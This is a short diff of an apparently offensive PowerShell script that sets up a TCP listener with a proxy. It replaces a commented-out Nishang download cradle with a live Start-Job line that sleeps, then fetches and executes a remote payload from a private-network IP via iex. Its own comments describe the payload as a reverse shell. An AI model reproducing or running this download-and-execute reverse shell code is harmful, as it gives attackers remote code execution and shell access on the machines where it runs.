@@ -13,8 +13,8 @@ $request.Proxy = $proxy
 
 $listener = new-object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Parse($bindIP), $bindPort)
 
-# start nishang in seperate command pointing to localhost on 5555
-# Start-Job { powershell  -c "iex (new-object net.webclient).downloadstring('http://192.168.0.197/rev-slim.txt')"}
+# is standard revshell that points to localhost
+Start-Job { powershell  -c "Start-sleep -s 5; iex (curl http://192.168.0.197/f.txt).content"}
 
 #-------------------------------------------------------------------------
 # This script block is executed in a separate PowerShell object, as another
